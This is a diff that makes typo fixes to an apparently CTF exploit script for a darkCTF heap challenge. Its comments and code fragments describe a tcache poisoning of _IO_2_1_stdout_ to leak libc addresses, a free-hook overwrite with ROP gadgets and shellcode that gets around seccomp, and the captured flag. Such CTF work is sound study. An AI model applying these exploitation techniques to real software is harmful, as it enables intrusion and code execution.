@@ -18,7 +18,7 @@ The plan is as follows:
        This will cause the next call to print to need to "catchup", and it will end up printing part of the
        file stream structure itself, leaking libc addresses (see https://vigneshsrao.github.io/babytcache/)
 2) Gain control of RIP by overwriting the malloc free hook. The binary sets up seccomp, meaning we can't just
-   overwtite that with system. Thankfully mprotect is allowed
+   overwrite that with system. Thankfully mprotect is allowed
     a) Overwrite the free hook with the address of an ADD RSP; RET gadget. Also put a ROP chain and shellcode
        in the same area.
     b) Use hidden "sign guest book" option to place a POP RSP; RET gadget on the stack. The ADD RSP; RET gadget
@@ -102,7 +102,6 @@ def start():
 
 notes = [False, False, False, False, False]
 
-
 def write_note(io, content="", size=None, clean=True):
     global notes
 
@@ -184,7 +183,7 @@ def exploit(io):
     free_note(io, C2)
     free_note(io, C2_1)
   
-    # Overwrite tcache pointer with address of _IO_2_1_stdout_ (subject ot ASLR)
+    # Overwrite tcache pointer with address of _IO_2_1_stdout_ (subject to ASLR)
     stdout_overwrite = 0x8760
     if args.GDB:
         stdout_overwrite = 0x3760 # If GDB assume ASLR is turned off 
@@ -301,7 +300,7 @@ else:
             print("*** GOODBYE ***")
             raise
         except:
-            print("*** ALSR WRONG ***")
+            print("*** ASLR WRONG ***")
             io.close()
 
 # darkCTF{Std0U7_L3aK/i5_JuST_pure_m4gIc}
